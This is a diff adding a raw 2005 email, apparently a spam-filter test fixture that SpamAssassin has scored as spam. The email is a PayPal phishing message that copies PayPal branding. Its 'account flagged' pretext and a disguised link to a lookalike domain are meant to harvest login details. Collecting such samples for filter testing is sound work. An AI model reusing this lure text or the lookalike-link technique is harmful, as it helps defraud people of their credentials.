@@ -1,0 +1,175 @@
+Return-Path: <service@paypal.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP
+	id 2BE5A536E7A; Sun,  4 Dec 2005 13:42:10 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+	by mail2.example.com (Postfix) with ESMTP id 3CAFA6FA420;
+	Sun,  4 Dec 2005 13:42:08 -0500 (EST)
+Received: from 192.168.0.100 (adsl-67-127-38-241.dsl.anhm01.pacbell.net [67.127.38.241])
+	by mail2.example.com (Postfix) with SMTP;
+	Sun,  4 Dec 2005 13:42:08 -0500 (EST)
+Received: from LXG8 (v157.170.217.245.dux881.s.service@paypal.com [80.144.41.191])
+	by mail96.w.citifinancial.com (210.24.7my2/3.49.2) with SMTP id gna96YVF73QNTxaw9495;
+	Sun, 04 Dec 2005 14:42:14 -0400
+Message-Id: <2981655360299366108.7807.84789@jfcg-o5.localhost>
+From: "PayPal" <service@paypal.com>
+To: nobody@example.com, faxlist-digest@example.com,
+	madonna-digest@example.com
+References: <placental435-RZX1HVFdpgZpbE82VE533k079@service@paypal.com>
+Subject: PayPal Account (KMM15704117V21840L0KB)
+X-YMLPcode: clang_0_wills
+Date: Sun, 04 Dec 2005 22:43:14 +0400
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--66396224937412452773"
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ***********
+X-Spam-Status: Yes, score=11.3 required=5.0 tests=HTML_MESSAGE,
+	HTML_MIME_NO_HTML_TAG,MIME_BOUND_DD_DIGITS,MIME_HTML_ONLY,
+	MIME_HTML_ONLY_MULTI,MPART_ALT_DIFF,RCVD_IN_BL_SPAMCOP_NET,
+	RCVD_IN_SORBS_WEB,RCVD_IN_XBL autolearn=no version=3.0.2
+X-Spam-Report: 
+	*  4.1 MIME_BOUND_DD_DIGITS Spam tool pattern in MIME boundary
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 MPART_ALT_DIFF BODY: HTML and text parts are different
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+	*      [Blocked - see <http://www.spamcop.net/bl.shtml?67.127.38.241>]
+	*  3.1 RCVD_IN_XBL RBL: Received via a relay in Spamhaus XBL
+	*      [67.127.38.241 listed in sbl-xbl.spamhaus.org]
+	*  0.0 RCVD_IN_SORBS_WEB RBL: SORBS: sender is a abuseable web server
+	*      [67.127.38.241 listed in dnsbl.sorbs.net]
+	*  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+	*  2.4 MIME_HTML_ONLY_MULTI Multipart message only has text/html MIME parts
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 83
+
+----66396224937412452773
+Content-Type: text/html;
+	charset="iso-8410-6"
+Content-Transfer-Encoding: 7Bit
+
+</style>
+</head>
+
+<BODY><TABLE><TR><TD bgcolor="#ffffff">
+<table width="600" cellspacing="0" cellpadding="0" border="0" align="center">
+<tr valign="top">
+	<td><a href="https://www.paypal.com/us" target="_blank" ><img src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt="PayPal" border="0"></a></td>
+</tr>
+</table>
+
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+	<td background="http://images.paypal.com/images/bg_clk.gif" width="100%"><img src="http://images.paypal.com/images/pixel.gif" height="29" width="1" border="0"></td>
+</tr>
+<tr>
+	<td><img src="http://images.paypal.com/images/pixel.gif" height="10" width="1" border="0"></td>
+</tr>
+</table>
+
+<table width="600" cellspacing="0" cellpadding="0" border="0" align="center">
+<tr valign="top">
+	<td width="400">
+	<table width="100%" cellspacing="0" cellpadding="5" border="0">
+		<tr>
+			<td>Dear PayPal Member,<br><br>
+Your account has been randomly flagged in our system as a part of our routine security measures. 
+This is a must to ensure that only you have access and use of your PayPal account and to ensure a safe PayPal experience. We require all flagged accounts to verify their information on file with us. To verify your Information at this time, please visit our secure server webform by clicking the hyperlink below
+<br><br>
+ 
+<table width="75%" cellpadding="1" cellspacing="0" border="0" bgcolor="#FFE65C" align="left">
+<tr>
+<td>
+	<table width="100%" cellpadding="4" cellspacing="0" border="0" bgcolor="#FFFECD" align="center">
+		<tr>
+			<td class="pp_sansserif" align="center"><a href="http://www.paypal.com.flaggedaccount.rbaccess.info?login_cmd=login_access=1109785584" target="_blank" > Click here to verify your Information</a></td>
+		</tr>
+	</table>
+</td>
+</tr>
+</table>
+
+<br>
+<br>
+<br>
+ Thank you for using PayPal!<br>
+The PayPal Team</td>
+</tr>
+
+<tr>
+<td>
+<hr class="dotted">
+</td>
+</tr>
+
+<tr>
+<td>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+<td class="pp_footer">Please do not reply to this e-mail. Mail sent
+to this address cannot be answered. For assistance, log
+in</a> to your PayPal account and choose the "Help" link in the
+footer of any page.<br>
+<br class="h10">
+ To receive email notifications in plain text instead of HTML,
+update your preferences <a href="https://www.paypal.com/us/PREFS-NOTI" target="_blank" > here</a>.</td>
+</tr>
+
+<tr>
+	<td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10" width="1" border="0"></td>
+</tr>
+</table>
+</td>
+</tr>
+
+<tr>
+	<td><br><span class="pp_footer">PayPal Email ID PP478<br><br></span></td>
+</tr>
+</table>
+</td>
+<td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="1" width="10" border="0"></td>
+<td width="190" valign="top">
+<table width="100%" cellspacing="0" cellpadding="1" border="0" bgcolor="#CCCCCC">
+<tr>
+	<td>
+	<table width="100%" cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff">
+	<tr>
+	<td>
+		<table width="100%" cellspacing="0" cellpadding="5" border="0" bgcolor="#EEEEEE">
+		<tr>
+		<td class="pp_sidebartextbold" align="center">Protect Your Account Info</td>
+		</tr>
+		</table>
+		
+<table width="100%" cellspacing="0" cellpadding="5" border="0">
+<tr>
+<td class="pp_sidebartext">Make sure you never provide your
+password to fraudulent websites.<br>
+<br>
+To safely and securely access the PayPal website or your account,
+open up a new web browser (e.g. Internet Explorer or Netscape) and
+type in the PayPal URL (http://www.paypal.com/).<br>
+<br>
+PayPal will never ask you to enter your password in an email.<br>
+<br>
+ For more information on protecting yourself from fraud, please
+review our Security Tips at http://www.paypal.com/securitytips<br>
+<img src="http://images.paypal.com/en_US/images/pixel.gif" height=
+"5" width="1" border="0"></td>
+</tr>
+</table>
+</td>
+</tr>
+
+
+
+
+
+----66396224937412452773--
+
